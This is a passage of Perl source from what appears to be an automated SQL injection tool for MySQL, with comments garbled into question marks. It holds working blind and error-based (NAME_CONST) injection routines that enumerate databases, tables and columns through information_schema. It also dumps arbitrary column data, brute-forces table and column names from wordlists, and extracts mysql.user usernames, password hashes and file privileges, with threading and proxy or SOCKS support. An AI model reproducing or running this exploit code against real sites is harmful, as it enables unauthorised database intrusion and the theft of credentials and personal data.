print "--------------------------------------------------------\n";
} else {
print "\n------------------------------------------------------\n";
print "Cant't get data...\n";
print "------------------------------------------------------\n";
}
$time = localtime;
print $time . "\n";
print "-----------------------------------\n";
## start from2 ##
print FILE1 "-----------------------------------------\n";
print FILE1 "Tables - $bl_table_number_NIS\n";
print FILE1 "-----------------------------------------\n";
print "Normal MODE - records > 10\n";
print "Fast MODE - records <= 10\n";
print "-----------------------------------------\n";
print "Get ALL tables ($bl_table_number_NIS) ? (1/0): ";
$choice = <STDIN>;
chomp $choice;
$thr = $kol_threads; # ???-?? ???????
if ($choice == 1) {
$num = -1; # ?? ????????
} else {
print "Enter START_position: ";
$choice1 = <STDIN>;
chomp $choice1;
$num = $choice1-2;
print "Enter END_position: ";
$choice2 = <STDIN>;
chomp $choice2;
$bl_table_number_NIS = $choice2-1;
print "Dump records from [" . ($num+2) . "] to [" . ($bl_table_number_NIS+1) . "]\n";
}
print "-----------------------------------------\n";
## end from2
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
TABLES:
$time = localtime;
print $time . "\n";
print "-----------------------------------\n";
# ?????? ??????? #
$bl_lenght = "";
$ii = 0;
$s = 0;
$mflag = 0;
print "-----------------------------------\n";
for(0..$thr) {
$trl[$_] = threads->create(\&gets102);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets102 {
$| = 1;
while ($num < $bl_table_number_NIS) {
{ lock($num);
$num++; }
$sss = $num;
$bl_current = "(select" . $bl_plus . "table_name" . $bl_plus . "from" . $bl_plus . "information_schema.tables" . $bl_plus . "where" . $bl_plus . "table_schema!=0x696e666f726d6174696f6e5f736368656d 61" . $bl_plus . "limit" . $bl_plus . $num . ",1)";
if ($bl_mode==0) {
$bl_lenght = len_check();
} else {
$bl_lenght = len_check1(); 
} 
if (($bl_lenght >= 1) && ($bl_lenght < 1000)) {
print "\ntable limit $sss,1 [length]:" . $bl_lenght . "\n";
if ($mflag == 1) {
################################################## ##########
%aa = ();
$aa = gets1000();
$data1 = "";
$data1 .= $aa->{$_},for sort {$a <=> $b} keys %$aa;
################################################## ###########
} else {
$data1 = "";
for ($ii = 1; $ii <= $bl_lenght; $ii++) {
if ($bl_mode==0) {
$data1 .= chr(get_res_normal());
} else {
$data1 .= chr(get_res_normal1());
} 
print $data1 . "\r";
}
}
print "\n-----------------------------------\n";
print " ---> table limit $sss,1: " . $data1 . "\n";
print "-----------------------------------\n";
print FILE1 " ---> table limit $sss,1: " . $data1 . "\n";
$data = "";
}
sleep $pause;
}
}
print "----------\n";
print "Saved in " . "z_" . $host3 . ".txt\n";
close(FILE1);
goto START10;
}
if ($choice==9) {
sub ascii_to_hex ($) {
(my $str = shift) =~ s/(.|\n)/sprintf("%02lx", ord $1)/eg;
$str = "0x" . $str;
return $str;
}
open( FILE1, ">>" . "z_" .$host3 . ".txt" ); # ???? ??? ?????? ???????????
print "-----------------------------------------\n";
print "Enter the table_name: ";
$choice = <STDIN>;
chomp $choice;
if ($choice =~ m/-/imgs) {$choice = "`" . $choice . "`"}
print "Table: $choice\n";
print "----------\n";
print FILE1 "-----------------------------------------\n";
print FILE1 "Table [ $choice ]\n";
print FILE1 "-----------------------------------------\n";
COLUMNS:
$table_name = $choice;
$table_name1 = ascii_to_hex $table_name;
# ?????? ???-?? ??????? ? ??????? #
print "-----------------------------------\n";
## ???????? ##
$bl_lenght = "";
$ii = 0;
$bl_column_number = "";
$bl_current = "(select" . $bl_plus . "count(column_name)" . $bl_plus . "from" . $bl_plus . "information_schema.columns" . $bl_plus . "where" . $bl_plus . "table_name=" . $table_name1 . ")";
if ($bl_mode==0) {
$bl_lenght = len_check();
} else {
$bl_lenght = len_check1(); 
} 
if (($bl_lenght >= 1) && ($bl_lenght < 1000)) {
print "Count columns from $table_name [length]:" . $bl_lenght . "\n";
################################################## ##########
for ($ii = 1; $ii <= $bl_lenght; $ii++) {
if ($bl_mode==0) {
$bl_column_number .= get_res_count();
} else {
$bl_column_number .= get_res_count1();
} 
print $bl_column_number . "\r";
sleep $pause;
}
print "\n------------------------------------------------------\n";
print "Count columns from $table_name [value]:" . $bl_column_number . "\n";
print "--------------------------------------------------------\n";
if ($bl_column_number <=10 ) {
print "Fast MODE - records <= 10\n";
} else {
print "Normal MODE - records > 10\n";
}
print "--------------------------------------------------------\n";
print FILE1 "Count columns from $table_name:" . $bl_column_number . "\n";
} else {
print "\n------------------------------------------------------\n";
print "Cant't get data...\n";
print "------------------------------------------------------\n";
}
$mflag = 0;
print "-----------------------------------\n";
$time = localtime;
print $time . "\n";
print "-----------------------------------\n";
## ?????? ??????? ##
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
# ?????? ??????? #
print "----------------------------------------------\n";
$thr = $kol_threads; # ???-?? ???????
$num = -1; # ?? ????????
$bl_lenght = "";
$ii = 0;
$s = 0;
print "Get columns from $table_name:\n";
print "-------------------------------------------------------------\n";
for(0..$thr) {
$trl[$_] = threads->create(\&gets103);
}
for(0..$thr) {
$trl[$_]->join;
}
$time = localtime;
print $time . "\n";
sub gets103 {
$| = 1;
while ($num < $bl_column_number) {
{ lock($num);
$num++; }
$sss = $num;
$bl_current = "(select" . $bl_plus . "column_name" . $bl_plus . "from" . $bl_plus . "information_schema.columns" . $bl_plus . "where" . $bl_plus . "table_name=" . $table_name1 . $bl_plus . "limit" . $bl_plus . $num . ",1)";
if ($bl_mode==0) {
$bl_lenght = len_check();
} else {
$bl_lenght = len_check1(); 
} 
if (($bl_lenght >= 1) && ($bl_lenght < 1000)) {
print "\ncolumn limit $sss,1 [length]:" . $bl_lenght . "\n";
if ($mflag == 1) {
################################################## ##########
%aa = ();
$aa = gets1000();
$data1 = "";
$data1 .= $aa->{$_},for sort {$a <=> $b} keys %$aa;
################################################## ###########
} else {
$data1 = "";
for ($ii = 1; $ii <= $bl_lenght; $ii++) {
if ($bl_mode==0) {
$data1 .= chr(get_res_normal());
} else {
$data1 .= chr(get_res_normal1());
} 
print $data1 . "\r";
}
}
print "\n-----------------------------------\n";
print " ---> column limit $sss,1: " . $data1 . "\n";
print "-----------------------------------\n";
print FILE1 " ---> column limit $sss,1: " . $data1 . "\n";
$data = "";
}
sleep $pause;
}
}
print FILE1 "----------\n";
print "----------\n";
print "Saved in " . "z_" . $host3 . ".txt\n";
close(FILE1);
goto START10;
}
if ($choice==10) {
$schema_flag = 0;
sub ascii_to_hex ($) {
(my $str = shift) =~ s/(.|\n)/sprintf("%02lx", ord $1)/eg;
$str = "0x" . $str;
return $str;
}
open( FILE1, ">>" . "z_" .$host3 . ".txt" ); # ???? ??? ?????? ???????????
print "-----------------------------------------\n";
print "Enter the table_name: ";
$choice = <STDIN>;
chomp $choice;
if ($choice =~ m/-/imgs) {$choice = "`" . $choice . "`"}
$table_name = $choice;
$table_name1 = ascii_to_hex $table_name;
print "-----------------------------------------\n";
print "MySQL>=5 or MySql<5? (1/0): ";
$choice = <STDIN>;
chomp $choice;
if ($choice == 1) {
BL_TABLE_SCHEMA:
$schema_flag = 1;
print "-----------------------------------------------------\n";
print "Getting table_schema for $table_name, wait please... \n";
print "-----------------------------------------------------\n";
$bl_lenght = "";
$bl_table_schema = "";
$ii = 0;
$bl_current = "(select" . $bl_plus . "table_schema" . $bl_plus . "from" . $bl_plus . "information_schema.tables" . $bl_plus . "where" . $bl_plus . "table_name=" . $table_name1 . ")";
if ($bl_mode==0) {
$bl_lenght = len_check();
} else {
$bl_lenght = len_check1(); 
} 
if (($bl_lenght >= 1) && ($bl_lenght < 1000)) {
print "Table_schema for table user [length]:" . $bl_lenght . "\n";
################################################## ##########
%aa = ();
$aa = gets1005();
$data1 = "";
$data1 .= $aa->{$_},for sort {$a <=> $b} keys %$aa;
################################################## ###########
$bl_table_schema = $data1;
if ($bl_table_schema =~ m/-/imgs) {$bl_table_schema = "`" . $choice . "`"}
$schema_flag = 0;
print "\n------------------------------------------------------\n";
print "Table_schema for table user [value]:" . $bl_table_schema . "\n";
} else {
print "\n------------------------------------------------------\n";
print "Cant't get data...\n";
print "------------------------------------------------------\n";
}
$table_name = $bl_table_schema . "." . $table_name;
}
print "-----------------------------------------\n";
print "Table: $table_name\n";
print "-----------------------------------------\n";
################################################## ################################################## ##########
print "Enter the column(s) name(s) - for example - id or id,username,user_password:\n";
$choice = <STDIN>;
chomp $choice;
$column_name = $choice;
print FILE1 "-----------------------------------------\n";
print FILE1 "Dump column(s): [ " . $column_name . " ] from [ " .$table_name . " ]\n";
print FILE1 "-----------------------------------------\n";
print "Dump column(s): [ " . $column_name . " ] from [ " .$table_name . " ]\n";
print "-----------------------------------------\n";
print "Do you want add condition to sql-query?\n";
print "----------\n";
print "for example - where id=1 ? (1/0): ";
$choice11 = <STDIN>;
chomp $choice11;
$condition=0;
if ($choice11==1) {
print "-----------------------------------------\n";
print "Enter your condition here - only one condition, without 'where', '+' and quotes, example - id=1 :\n";
print "----------\n";
$choice11 = <STDIN>;
chomp $choice11;
$where = $choice11;
print "Your condition: [ where $where ]\n";
$condition=1;
} else {
$condition=0;
}
if ($condition==0) {
$turbo_flag = 0;
# ?????? ???-?? ?????? ??????? #
print "-----------------------------------\n";
print "Count data from [ $table_name ]:\n";
# ?????? ???-?? ?????? ??????? #
print "-----------------------------------\n";
## ???????? ##
$bl_lenght = "";
$ii = 0;
$bl_column_number_DATA = "";
$bl_current = "(select" . $bl_plus . "count(*)" . $bl_plus . "from" . $bl_plus . $table_name . ")";
if ($bl_mode==0) {
$bl_lenght = len_check();
} else {
$bl_lenght = len_check1(); 
} 
if (($bl_lenght >= 1) && ($bl_lenght < 1000)) {
print "Count ALL DATA from " . $table_name . "[length]:" . $bl_lenght . "\n";
for ($ii = 1; $ii <= $bl_lenght; $ii++) {
if ($bl_mode==0) {
$bl_column_number_DATA .= get_res_count();
} else {
$bl_column_number_DATA .= get_res_count1();
} 
print $bl_column_number_DATA . "\r";
sleep $pause;
}
print "\n------------------------------------------------------\n";
print "Count ALL DATA from " . $table_name . " [value]:" . $bl_column_number_DATA . "\n";
print "--------------------------------------------------------\n";
print "Normal MODE - records > 10\n";
print "Fast MODE - records <= 10\n";
print "TURBO-MODE - 1 record, 1 column\n";
print "MD5-TURBO-MODE - 1 record, 1 column, MD5-hash\n";
print "-----------------------------------------\n";
} else {
print "Cant't get data...\n";
}
$mflag = 0;
print "-----------------------------------\n";
$time = localtime;
print $time . "\n";
print "-----------------------------------\n";
## start from2 ##
print "Get ALL data from " . $table_name . " (" . $bl_column_number_DATA . ") ? (1/0): ";
$choice = <STDIN>;
chomp $choice;
$thr = $kol_threads; # ???-?? ???????
if ($choice == 1) {
$num = -1; # ?? ????????
} else {
print "Enter START_position: ";
$choice1 = <STDIN>;
chomp $choice1;
$num = $choice1-1;
print "Enter END_position: ";
$choice2 = <STDIN>;
chomp $choice2;
$bl_column_number_DATA = $choice2-1;
print "Dump records from [" . ($num+2) . "] to [" . ($bl_column_number_DATA+1) . "]\n";
$rec_number = ($bl_column_number_DATA+1) - ($num+2);
if ($rec_number == 0) {
print "\n---------------------------------------------------------------\n";
print "Dump just one record, switching to TURBO-MODE....check\n";
($x,$y) = split (/,/,$column_name);
if ($y) {
"\n---------------------------------------------------------------\n";
print "Sorry, just one column for TURBO-MODE\n";
"---------------------------------------------------------------\n";
$turbo_flag = 0;
} else {
print "\n---------------------------------------------------------------\n";
print "Detecting just one column & one record - is it MD5-HASH? (1/0): ";
$choice_t = <STDIN>;
chomp $choice_t;
if ($choice_t == 1) {
$turbo_flag = 2;
print "================================================== =====\n";
print "MD5-TURBO-MODE GRANTED\n";
print "================================================== =====\n";
} else {
$turbo_flag = 1;
print "================================================== =====\n";
print "TURBO-MODE GRANTED\n";
print "================================================== =====\n";
}
}

}
}
print "-----------------------------------------\n";
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
## end from2
# ?????? ?????? ?? ??????? #
$bl_lenght = "";
$ii = 0;
$s = 0;
print "Get columns [$column_name] from [$table_name]:\n";
print "------------------------\n";
for(0..$thr) {
$trl[$_] = threads->create(\&gets104);
}
for(0..$thr) {
$trl[$_]->join;
}
$time = localtime;
print $time . "\n";
print "----------------------\n";
sub gets104 {
$| = 1;
while ($num < $bl_column_number_DATA) {
{ lock($num);
$num++; }
$sss = $num;
$bl_current = "(select" . $bl_plus . "concat_ws(0x3a," . $column_name . ")" . $bl_plus . "from" . $bl_plus . $table_name . $bl_plus . "limit" . $bl_plus . $num . ",1)";
if ($turbo_flag == 2) {
$bl_lenght = 32;
} else {
if ($bl_mode==0) {
$bl_lenght = len_check();
} else {
$bl_lenght = len_check1(); 
} 
}
if (($bl_lenght >= 1) && ($bl_lenght < 1000)) {
print "\nRecord limit $sss,1 [length]:" . $bl_lenght . "\n";
if ($mflag == 1) {
################################################## ##########
%aa = ();
if ($turbo_flag == 0) {$aa = gets1000();}
if ($turbo_flag == 1) {$aa = TURBO();}
if ($turbo_flag == 2) {$aa = md5();}
$data1 = "";
$data1 .= $aa->{$_},for sort {$a <=> $b} keys %$aa;
################################################## ###########
} else {
$data1 = "";
for ($ii = 1; $ii <= $bl_lenght; $ii++) {
if ($bl_mode==0) {
$data1 .= chr(get_res_normal());
} else {
$data1 .= chr(get_res_normal1());
} 
print $data1 . "\r";
}
}
print "\n-----------------------------------\n";
print " ---> Record limit $sss,1: " . $data1 . "\n";
print "-----------------------------------\n";
print FILE1 " ---> Record limit $sss,1: " . $data1 . "\n";
}
sleep $pause;
}
}
print "----------\n";
print "Saved in " . "z_" . $host3 . ".txt\n";
close(FILE1);
goto START10;
} else {
## ?????? ?????? ?? ??????? ##
$turbo_flag = 0;
print "Count data from [ $table_name ] with [ where " . $where . " ] \n";
# ?????? ???-?? ?????? ??????? #
print "-----------------------------------\n";
## ???????? ##
$bl_lenght = "";
$ii = 0;
$bl_column_number_DATA = "";

$bl_current = "(select" . $bl_plus . "count(*)" . $bl_plus . "from" . $bl_plus . $table_name . $bl_plus . "where" . $bl_plus . $where . ")";
if ($bl_mode==0) {
$bl_lenght = len_check();
} else {
$bl_lenght = len_check1(); 
} 
if (($bl_lenght >= 1) && ($bl_lenght < 1000)) {
print "Count ALL DATA from " . $table_name . "[length]:" . $bl_lenght . "\n";
for ($ii = 1; $ii <= $bl_lenght; $ii++) {
if ($bl_mode==0) {
$bl_column_number_DATA .= get_res_count();
} else {
$bl_column_number_DATA .= get_res_count1();
} 
print $bl_column_number_DATA . "\r";
sleep $pause;
}
print "\n------------------------------------------------------\n";
print "Count ALL DATA from " . $table_name . " [value]:" . $bl_column_number_DATA . "\n";
print "--------------------------------------------------------\n";
print "Normal MODE - records > 10\n";
print "Fast MODE - records <= 10\n";
print "TURBO-MODE - 1 record, 1 column\n";
print "MD5-TURBO-MODE - 1 record, 1 column, MD5-hash\n";
print "-----------------------------------------\n";
} else {
print "\n------------------------------------------------------\n";
print "Cant't get data...\n";
print "------------------------------------------------------\n";
}
print "-----------------------------------\n";
$mflag = 0;
$time = localtime;
print $time . "\n";
print "-----------------------------------\n";
## start from2 ##
print "Get ALL data from " . $table_name . " (" . $bl_column_number_DATA . ") ? (1/0): ";
$choice = <STDIN>;
chomp $choice;
$thr = $kol_threads; # ???-?? ???????
if ($choice == 1) {
$num = -1; # ?? ????????
} else {
print "Enter START_position: ";
$choice1 = <STDIN>;
chomp $choice1;
$num = $choice1-1;
print "Enter END_position: ";
$choice2 = <STDIN>;
chomp $choice2;
$bl_column_number_DATA = $choice2-1;
print "Dump records from [" . ($num+2) . "] to [" . ($bl_column_number_DATA+1) . "]\n";
$rec_number = ($bl_column_number_DATA+1) - ($num+2);
if ($rec_number == 0) {
print "\n---------------------------------------------------------------\n";
print "Dump just one record, switching to TURBO-MODE....check\n";
($x,$y) = split (/,/,$column_name);
if ($y) {
"\n---------------------------------------------------------------\n";
print "Sorry, just one column for TURBO-MODE\n";
"---------------------------------------------------------------\n";
$turbo_flag = 0;
} else {
print "\n---------------------------------------------------------------\n";
print "Detecting just one column & one record - is it MD5-HASH? (1/0): ";
$choice_t = <STDIN>;
chomp $choice_t;
if ($choice_t == 1) {
$turbo_flag = 2;
print "================================================== =====\n";
print "MD5-TURBO-MODE GRANTED\n";
print "================================================== =====\n";
} else {
$turbo_flag = 1;
print "================================================== =====\n";
print "TURBO-MODE GRANTED\n";
print "================================================== =====\n";
}
}

}
}
print "-----------------------------------------\n";
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
## end from2
# ?????? ?????? ?? ??????? #
$bl_lenght = "";
$ii = 0;
$s = 0;
print "Get columns from $table_name:\n";
print "------------------------\n";
for(0..$thr) {
$trl[$_] = threads->create(\&gets105);
}
for(0..$thr) {
$trl[$_]->join;
}
$time = localtime;
print $time . "\n";
print "----------------------\n";
sub gets105 {
$| = 1;
while ($num < $bl_column_number_DATA) {
{ lock($num);
$num++; }
$sss = $num;
$bl_current = "(select" . $bl_plus . "concat_ws(0x3a," . $column_name . ")" . $bl_plus . "from" . $bl_plus . $table_name . $bl_plus . "where" . $bl_plus . $where . $bl_plus . "limit" . $bl_plus . $num . ",1)";
if ($turbo_flag == 2) {
$bl_lenght = 32;
} else {
if ($bl_mode==0) {
$bl_lenght = len_check();
} else {
$bl_lenght = len_check1(); 
} 
}
if (($bl_lenght >= 1) && ($bl_lenght < 1000)) {
print "\nRecord limit $sss,1 [length]:" . $bl_lenght . "\n";
if ($mflag == 1) {
################################################## ##########
%aa = ();
if ($turbo_flag == 0) {$aa = gets1000();}
if ($turbo_flag == 1) {$aa = TURBO();}
if ($turbo_flag == 2) {$aa = md5();}
$data1 = "";
$data1 .= $aa->{$_},for sort {$a <=> $b} keys %$aa;
################################################## ###########
} else {
$data1 = "";
for ($ii = 1; $ii <= $bl_lenght; $ii++) {
if ($bl_mode==0) {
$data1 .= chr(get_res_normal());
} else {
$data1 .= chr(get_res_normal1());
} 
print $data1 . "\r";
}
}
print "\n-----------------------------------\n";
print " ---> Record limit $sss,1: " . $data1 . "\n";
print "-----------------------------------\n";
print FILE1 " ---> Record limit $sss,1: " . $data1. "\n";
}
sleep $pause;
}
}
print "----------\n";
print "Saved in " . "z_" . $host3 . ".txt\n";
close(FILE1);
goto START10;
}
}
if ($choice==11) {
START11:
print " [1] Brute table\n";
print " [2] Brute column\n";
print " [3] Main menu\n";
print "----------\n";
$choice = <STDIN>;
chomp $choice;
print "Your choice: $choice\n";
print "-------------\n";
if ($choice == 1) {
open( FILE1, ">>" . "z_" .$host3 . ".txt" ); # ???? ??? ?????? ???????????
print " Brute tables\n";
print " -------------\n";
print FILE1 " Brute tables\n";
print FILE1 " -------------\n";
open(FILE, "<", $source_table_list);
while(<FILE>) {
chomp;
push(@tables4, $_);
}
close(FILE);
print "Add prefix for brute tables ? ( for example - PHPBB_ ) (1/0): ";
$choice = <STDIN>;
chomp $choice;
if ($choice == 1) {
print "Enter your prefix for brute tables: ";
$choice = <STDIN>;
chomp $choice;
$pref_brute = $choice;
} else {
$pref_brute = "";
}
$size = 0;
$size = @tables4;
print "File: $source_table_list\n";
print "Tables: $size\n";
print "-------------\n";
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
$thr = $kol_threads; # ???-?? ???????
$num = -1; # ?? ????????
for(0..$thr) {
$trl[$_] = threads->create(\&gets106);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets106 {
$| = 1;
while ($num<$size) {
{ lock($num);
$num++; }
$chek_len20 = 0;
$current1 = $pref_brute . $tables4[$num];
$bl_query = $bl_url . $bl_plus . "and" . $bl_plus . "(select" . $bl_plus . "1" . $bl_plus . "from" . $bl_plus . $current1 . $bl_plus . "limit" . $bl_plus . "0,1)=1" . $bl_filtr;
$chek_len20 = wr_check();
if($chek_len20 == 1) {
print " ---> " . $current1 . "\n";
print FILE1 " " . $current1 . "\n";
}
print $num . "\r";
sleep $pause;

}
}
print "----------\n";
print "Saved in " . "z_" . $host3 . ".txt\n";
close(FILE1);
goto START11;
}
if ($choice == 2) {
open( FILE1, ">>" . "z_" .$host3 . ".txt" ); # ???? ??? ?????? ???????????
print " Brute columns\n";
print " -------------\n";
print FILE1 " Brute columns\n";
print FILE1 " -------------\n";
print "Enter the table_name for brute: \n";
$choice = <STDIN>;
chomp $choice;
$table = $choice;
print "Brute columns for table [ " . $table . " ]\n";
print "-------------\n";
open(FILE, "<", $source_column_list);
while(<FILE>) {
chomp;
push(@columns4, $_);
}
close(FILE);
print "Add prefix for brute columns? ( for example - PHPBB_ ) (1/0): ";
$choice = <STDIN>;
chomp $choice;
if ($choice == 1) {
print "Enter your prefix for brute columns: ";
$choice = <STDIN>;
chomp $choice;
$pref_brute = $choice;
} else {
$pref_brute = "";
}
$size = 0;
$size = @columns4;
print "-------------\n";
print "File: $source_column_list\n";
print "Columns: $size\n";
print "-------------\n";
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
$thr = $kol_threads; # ???-?? ???????
$num = -1; # ?? ????????
for(0..$thr) {
$trl[$_] = threads->create(\&gets107);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets107 {
$| = 1;
while ($num<$size) {
{ lock($num);
$num++; }
$chek_len20 = 0;
$current1 = $pref_brute . $columns4[$num];
$bl_query = $bl_url . $bl_plus . "and" . $bl_plus . "(select" . $bl_plus . "mid(concat(1," . $current1 . "),1,1)" . $bl_plus . "from" . $bl_plus . $table . $bl_plus . "limit" . $bl_plus . "0,1)=1" . $bl_filtr;
$chek_len20 = wr_check();
if($chek_len20 == 1) {
print " ---> " . $current1 . "\n";
print FILE1 " " . $current1 . "\n";
}
print $num . "\r";
sleep $pause;

}
}
print "----------\n";
print "Saved in " . "z_" . $host3 . ".txt\n";
close(FILE1);
goto START11;
}
if ($choice == 3) {
goto START10;
}
}
if ($choice == 12) {
goto START;
}
}# end blind
## mysql name_const ##
if ($choice == 11) {
if ($nc_url =~ m/^https:\/\/?([^\/]+)/i) {
$host6 = $1;
$https_flag = 1;
print "----------------------\n";
print "HTTPS mode enabled\n";
print "----------------------\n";
}
$host = $host6;
if ($https_mode_auth == 1 && $https_auth_check == 0 && $https_flag == 1) {
print "-----------------------------------------\n";
print "Authorization required, wait please....";
my $answ1 = req($host, $https_auth_script_path, 'POST', $https_auth_post_data, 0);
$ck1 = collect($answ1);
$https_auth_check = 1;
print " DONE\n";
print "-----------------------------------------\n";
}
if ($use_socks == 1 && $socks_check == 0) {
$check_url = $host;
our $query = "GET / HTTP/1.$http_protocol\r\n"
. "Host: $check_host\r\n"
. "Referer: http://" . $check_url . "\r\n"
. "Accept: */*\r\n"
. "User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090716 Ubuntu/9.04 (jaunty) Shiretoko/3.5.1\r\n"
. "Connection: close\r\n\r\n";
print "----------------------------------------\n";
print "You choose mode with SOCKS, try to find good in $socks_file ...\n";
print "Timeout = 5 sec:\n";
print "----------------------------------------\n";
$socks_check = 0;
$check_socks = socks_check();
($current_proxy_host,$current_proxy_port,$socks_ty pe) = split(/:/,$check_socks);
$proxy_message = "$current_proxy_host:$current_proxy_port, SOCKS" . $socks_type;
if ($current_proxy_host) {
$socks_check = 1;
print "Will use --> $proxy_message\n";
} else {
$socks_check = 0;
$proxy_message = "No";
print "No good SOCKS in " . $socks_file . ", change mode. Exit...\n";
}
}
START200:
print "-----------------------------------------\n";
print " Choose mode:\n";
print "-----------------------------------------\n";
print " [1] NAME_CONST - Mysql inj system information\n";
print " [2] NAME_CONST - get DB-names from information_schema.schemata\n";
print " [3] NAME_CONST - get tables from DB-name\n";
print " [4] NAME_CONST - get column_name from tables from DB-name\n";
print " [5] NAME_CONST - Mysql inj get tables from information_schema (current DB)\n";
print " [6] NAME_CONST - Mysql inj get column_name from table (current DB)\n";
print " [7] NAME_CONST - Mysql inj get data from columns\n";
print "-----------------------------------------\n";
print " [8] Main menu\n";
print "-----------------------------------------\n";
$choice = <STDIN>;
chomp $choice;
print "Your choice: $choice\n";
if ($choice==1) {
open( FILE, ">>" . "z_" . $host . ".txt" ); # ???? ??? ?????? ???????????
#### ?????? ?????? ################################################## ###
$temp = $sql_pref1 . "concat(0x7665723a,version())" . $sql_pref2;
$nc_start1 = $nc_start . $temp;
$nc_midle1 = $nc_midle . $temp;
$url1 = $nc_start1 . $nc_midle1 . $nc_end;
$nc_start1 = "";
$nc_midle1 = "";
#### ?????? ??? ???? ################################################## ###
$temp = $sql_pref1 . "concat(0x626173653a,database())" . $sql_pref2;
$nc_start1 = $nc_start . $temp;
$nc_midle1 = $nc_midle . $temp;
$url2 = $nc_start1 . $nc_midle1 . $nc_end;
$nc_start1 = "";
$nc_midle1 = "";
#### ?????? ????? ################################################## ###
$temp = $sql_pref1 . "concat(0x757365723a,user())" . $sql_pref2;
$nc_start1 = $nc_start . $temp;
$nc_midle1 = $nc_midle . $temp;
$url3 = $nc_start1 . $nc_midle1 . $nc_end;
$nc_start1 = "";
$nc_midle1 = "";
#### ?????? @@basedir ################################################## ###
$temp = $sql_pref1 . "concat(0x626173656469723a," . "@@" . "basedir)" . $sql_pref2;
$nc_start1 = $nc_start . $temp;
$nc_midle1 = $nc_midle . $temp;
$url4 = $nc_start1 . $nc_midle1 . $nc_end;
$nc_start1 = "";
$nc_midle1 = "";
#### ?????? @@datadir ################################################## ###
$temp = $sql_pref1 . "concat(0x646174616469723a," . "@@" . "datadir)" . $sql_pref2;
$nc_start1 = $nc_start . $temp;
$nc_midle1 = $nc_midle . $temp;
$url5 = $nc_start1 . $nc_midle1 . $nc_end;
$nc_start1 = "";
$nc_midle1 = "";
#### ?????? @@tmpdir ################################################## ###
$temp = $sql_pref1 . "concat(0x746d706469723a," . "@@" . "tmpdir)" . $sql_pref2;
$nc_start1 = $nc_start . $temp;
$nc_midle1 = $nc_midle . $temp;
$url6 = $nc_start1 . $nc_midle1 . $nc_end;
$nc_start1 = "";
$nc_midle1 = "";
#### ?????? @@version_compile_os ################################################## ###
$temp = $sql_pref1 . "concat(0x6f733a," . "@@" . "version_compile_os)" . $sql_pref2;
$nc_start1 = $nc_start . $temp;
$nc_midle1 = $nc_midle . $temp;
$url7 = $nc_start1 . $nc_midle1 . $nc_end;
$nc_start1 = "";
$nc_midle1 = "";
#### ?????? mysql.user ################################################## ###
$temp = "(select" . $nc_plus . $sql_pref1 . "concat(0x6d7973716c2e757365723a,user)" . $sql_pref2 . $nc_plus . "from" . $nc_plus . "mysql.user)";
$nc_start1 = $nc_start . $temp;
$nc_midle1 = $nc_midle . $temp;
$url8 = $nc_start1 . $nc_midle1 . $nc_end;
$nc_start1 = "";
$nc_midle1 = "";
#### ?????? mysql.password ################################################## ###
$temp = "(select" . $nc_plus . $sql_pref1 . "concat(0x6d7973716c2e70617373776f72643a,password)" . $sql_pref2 . $nc_plus . "from" . $nc_plus . "mysql.user)";
$nc_start1 = $nc_start . $temp;
$nc_midle1 = $nc_midle . $temp;
$url9 = $nc_start1 . $nc_midle1 . $nc_end;
$nc_start1 = "";
$nc_midle1 = "";
#### ?????? file_priv ################################################## ###
$temp = "(select" . $nc_plus . $sql_pref1 . "concat(0x66696c655f707269763a,file_priv)" . $sql_pref2 . $nc_plus . "from" . $nc_plus . "mysql.user" . $nc_plus . "where" . $nc_plus . "user=user)";
$nc_start1 = $nc_start . $temp;
$nc_midle1 = $nc_midle . $temp;
$url10 = $nc_start1 . $nc_midle1 . $nc_end;
$nc_start1 = "";
$nc_midle1 = "";
################################################## ###################
$thr = $kol_threads; # ???-?? ???????
$num = -1; # ?? ????????
print "-----------------------------------------\n";
print "System information:\n";
print "-----------------------------------------\n";
print FILE "-----------------------------------------\n";
print FILE "SQL: $url1\n";
print FILE "-----------------------------------------\n";
print FILE "System information:\n";
print FILE "-----------------------------------------\n";
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
for(0..$thr) {
$trl[$_] = threads->create(\&gets111);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets111 {
@array = ($url1,$url2,$url3,$url4,$url5,$url6,$url7,$url8,$ url9,$url10,$url11);
$size = @array; #???????? ?????? ???????
$| = 1;
while ($num<$size) {
{ lock($num);
$num++; }
$current = $array[$num];
$content = scan_url();
if ($content =~ m/ussr(.*?)ussr/img) {
print $1 . "\n";
print FILE $1 . "\n";
}
print $num . "\r";
sleep $pause;
}
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START200;
}#end 1
# DB from schemata
if ($choice == 2) {
open( FILE, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
## ???-?? ?? ? information_schema.schemata ##
$temp = "(select" . $nc_plus . $sql_pref1 . "count(schema_name)" . $sql_pref2 . $nc_plus . "from" . $nc_plus . "information_schema.schemata" . $nc_plus . "limit" . $nc_plus . "0,1)";
$nc_start1 = $nc_start . $temp;
$nc_midle1 = $nc_midle . $temp;
$current = $nc_start1 . $nc_midle1 . $nc_end;
$content = scan_url();
$bd_num = $content;
$bd_num =~ m/ussr(.*?)ussr/img;
$bd_num = $1-1;
print FILE "-----------------------------------------\n";
print FILE "Data bases in information_schema.schemata: $bd_num\n";
print FILE "-----------------------------------------\n";
print "-----------------------------------------\n";
print "Data bases in information_schema.schemata - $1\n";
print "-----------------------------------------\n";
$num = -1; # ?? ????????
$thr = $kol_threads; # ???-?? ???????
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
for(0..$thr) {
